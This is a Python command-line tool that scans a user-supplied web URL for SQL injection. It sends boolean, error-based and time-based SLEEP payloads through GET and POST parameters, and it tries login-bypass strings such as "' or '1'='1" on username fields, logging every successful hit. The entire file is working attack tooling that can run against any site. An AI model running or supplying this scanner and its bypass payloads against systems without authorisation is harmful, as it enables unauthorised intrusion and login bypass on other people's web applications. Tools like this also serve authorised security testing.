import difflib, http.client, itertools, optparse, random, re, time, urllib.parse, urllib.request

PREFIXES, SUFFIXES = (" ", ") ", "' ", "') "), ("", "-- -", "#", "%%16")
SQL_CHAR_POOL = ('(', ')', '\'', '"')
BOOLEAN_PAYLOADS = ("AND %d=%d", "OR NOT (%d>%d)")
TIME_BASED_PAYLOAD = "AND SLEEP(%d)"
HEADER_COOKIE, HEADER_USER_AGENT, HEADER_REFERRER = "Cookie", "User-Agent", "Referer"
METHOD_GET, METHOD_POST = "GET", "POST"
BODY_TEXT, STATUS_CODE, PAGE_TITLE, RAW_HTML = range(4)
SIMILARITY_THRESHOLD = 0.95
HTTP_TIMEOUT = 30
SLEEP_TIME = 5
RANDOM_INT = random.randint(1, 255)
BLOCK_MSG_PATTERN = r"(?i)(\A|\b)IP\b.*\b(banned|blocked|bl(a|o)ck\s?list|firewall)"

DBMS_PATTERNS = {
    "MySQL": (r"SQL syntax.*MySQL", r"Warning.*mysql_.*", r"valid MySQL result", r"MySqlClient\."),
    "PostgreSQL": (r"PostgreSQL.*ERROR", r"Warning.*\\Wpg_.*", r"valid PostgreSQL result", r"Npgsql\."),
    "Microsoft SQL Server": (r"SQL Server.*Driver", r"Warning.*mssql_.*"),
    "Oracle": (r"\\bORA-[0-9]{4}",),
}

BYPASS_APPENDIXES = ["'--", "' or '1'='1", "' or 1=1--", "') or ('1'='1"]
SQL_ERRORS = ["you have an error in your sql syntax", "warning", "mysql_fetch", "ORA-", "unterminated quoted string"]

def get_page_content(url, data=None):
    result = {STATUS_CODE: http.client.OK}
    try:
        req = urllib.request.Request(url, data.encode("utf8", "ignore") if data else None, globals().get("_headers", {}))
        response = urllib.request.urlopen(req, timeout=HTTP_TIMEOUT)
        result[RAW_HTML] = response.read()
        with open("response.txt", "w", encoding="utf-8") as debug_file:
            debug_file.write(result[RAW_HTML].decode("utf8", "ignore") if hasattr(result[RAW_HTML], "decode") else str(result[RAW_HTML]))
    except Exception as e:
        result[STATUS_CODE] = getattr(e, "code", None)
        result[RAW_HTML] = e.read() if hasattr(e, "read") else str(e.args[-1])
    result[RAW_HTML] = (result[RAW_HTML].decode("utf8", "ignore") if hasattr(result[RAW_HTML], "decode") else "") or ""
    result[RAW_HTML] = "" if re.search(BLOCK_MSG_PATTERN, result[RAW_HTML]) else result[RAW_HTML]
    title_match = re.search(r"<title>(?P<result>[^<]+)</title>", result[RAW_HTML], re.I)
    result[PAGE_TITLE] = title_match.group("result") if title_match else None
    result[BODY_TEXT] = re.sub(r"(?si)<script.+?</script>|<!--.+?-->|<style.+?</style>|<[^>]+>|\s+", " ", result[RAW_HTML])
    return result

def scan_for_sqli(url, data=None, param_index=None, param_total=1, method="POST"):
    found_any = False
    log = []
    parsed_url = urllib.parse.urlparse(url)
    host = parsed_url.netloc

    if method == "POST":
        params = data.split(",") if data else []
        if len(params) < param_total:
            print("(x) Not enough parameters provided in --data")
            return False
        param_kv = [kv.split("=") for kv in params]
    else:
        query = parsed_url.query
        param_kv = [kv.split("=") for kv in query.split("&") if "=" in kv]
        param_total = len(param_kv)
        base_url = url.split("?")[0]

    indices = [param_index] if param_index is not None else list(range(param_total))

    def build_data(kv_list):
        return "&".join("%s=%s" % (k, urllib.parse.quote(v)) for k, v in kv_list)

    base_data = build_data(param_kv)
    base_response = get_page_content(url if method == "GET" else url, None if method == "GET" else base_data)

    for idx in indices:
        param_name = param_kv[idx][0]
        original = param_kv[idx][1]
        detected = False
        for prefix, boolean, suffix, inline_comment in itertools.product(PREFIXES, BOOLEAN_PAYLOADS, SUFFIXES, (False, True)):
            if detected:
                break
            template = f"{prefix}{boolean}{suffix}".replace(" " if inline_comment else "/**/", "/**/")
            logic_payload = template % (RANDOM_INT, RANDOM_INT)
            param_kv[idx][1] = logic_payload
            test_data = build_data(param_kv)
            if method == "GET":
                test_url = f"{base_url}?{test_data}"
                response = get_page_content(test_url)
            else:
                response = get_page_content(url, test_data)

            html_lower = response[RAW_HTML].lower()
            if any(err in html_lower for err in SQL_ERRORS):
                msg1 = "SUCCESS: SQLi error message detected!"
                msg2 = f"Host: {host} | Parameter: {param_name}"
                msg3 = f"Payload: {test_data}"
                print(msg1)
                print(msg2)
                print(msg3)
                log.extend([msg1, msg2, msg3])
                found_any = True
                detected = True
                break

            if all(k in response for k in (BODY_TEXT, STATUS_CODE)) and base_response[STATUS_CODE] and response[STATUS_CODE] < http.client.INTERNAL_SERVER_ERROR:
                sim_ratio = difflib.SequenceMatcher(None, base_response[BODY_TEXT], response[BODY_TEXT]).quick_ratio()
                if sim_ratio < SIMILARITY_THRESHOLD:
                    msg1 = "SUCCESS: SQLi vulnerability detected!"
                    msg2 = f"Host: {host} | Parameter: {param_name}"
                    msg3 = f"Payload: {test_data}"
                    print(msg1)
                    print(msg2)
                    print(msg3)
                    log.extend([msg1, msg2, msg3])
                    found_any = True
                    detected = True
                    break

        if not detected and param_name.lower() in ("username", "user"):
            for appendix in BYPASS_APPENDIXES:
                param_kv[idx][1] = original + appendix
                test_data = build_data(param_kv)
                response = get_page_content(url if method == "POST" else f"{base_url}?{test_data}", None if method == "GET" else test_data)
                if all(k in response for k in (BODY_TEXT, STATUS_CODE)) and base_response[STATUS_CODE] and response[STATUS_CODE] < http.client.INTERNAL_SERVER_ERROR:
                    sim_ratio = difflib.SequenceMatcher(None, base_response[BODY_TEXT], response[BODY_TEXT]).quick_ratio()
                    success_indicators = ("welcome", "log out", "your account", "congratulations", "lab solved")
                    error_indicators = ("invalid", "incorrect", "wrong")
                    lower_response = response[RAW_HTML].lower()
                    if sim_ratio < SIMILARITY_THRESHOLD or any(k in lower_response for k in success_indicators):
                        if not any(k in lower_response for k in error_indicators):
                            msg1 = "SUCCESS: Login bypass SQLi detected!"
                            msg2 = f"Host: {host} | Parameter: {param_name}"
                            msg3 = f"Payload: {test_data}"
                            print(msg1)
                            print(msg2)
                            print(msg3)
                            log.extend([msg1, msg2, msg3])
                            found_any = True
                            detected = True
                            break

        if not detected:
            param_kv[idx][1] = TIME_BASED_PAYLOAD % SLEEP_TIME
            test_data = build_data(param_kv)
            start = time.time()
            if method == "GET":
                test_url = f"{base_url}?{test_data}"
                get_page_content(test_url)
            else:
                get_page_content(url, test_data)
            duration = time.time() - start
            if duration >= SLEEP_TIME:
                msg1 = "SUCCESS: Time-based SQLi vulnerability detected!"
                msg2 = f"Host: {host} | Parameter: {param_name}"
                msg3 = f"Payload: {test_data}"
                print(msg1)
                print(msg2)
                print(msg3)
                log.extend([msg1, msg2, msg3])
                found_any = True

        param_kv[idx][1] = original

    if not found_any:
        print("Scan complete: No vulnerability found.")

    with open("result.txt", "w") as f:
        f.write("\n".join(log))
    print("Results saved to result.txt")

    return found_any

def set_http_headers(cookie=None, user_agent=None, referer=None):
    globals()["_headers"] = dict(filter(lambda item: item[1], (
        (HEADER_COOKIE, cookie),
        (HEADER_USER_AGENT, user_agent or "GenericScanner"),
        (HEADER_REFERRER, referer)
    )))

if __name__ == "__main__":
    parser = optparse.OptionParser()
    parser.add_option("-u", "--url", dest="url", help="Target URL (e.g., http://example.com/login)")
    parser.add_option("--data", dest="data", help="POST data, comma-separated (e.g., username=admin,password=123)")
    parser.add_option("--pra", dest="pra", type="int", help="Total parameters")
    parser.add_option("--det", dest="det", type="int", help="Index of parameter to test (0-based)")
    parser.add_option("--all", action="store_true", dest="scan_all", help="Scan all parameters")
    parser.add_option("--cookie", dest="cookie", help="HTTP Cookie value")
    parser.add_option("--user-agent", dest="ua", help="HTTP User-Agent string")
    parser.add_option("--referer", dest="referer", help="HTTP Referer header")
    options, _ = parser.parse_args()

    if options.url:
        set_http_headers(options.cookie, options.ua, options.referer)
        method = METHOD_POST if options.data else METHOD_GET
        scan_for_sqli(
            options.url,
            options.data,
            None if options.scan_all else options.det,
            options.pra if options.pra is not None else 1,
            method
        )
    else:
        parser.print_help()
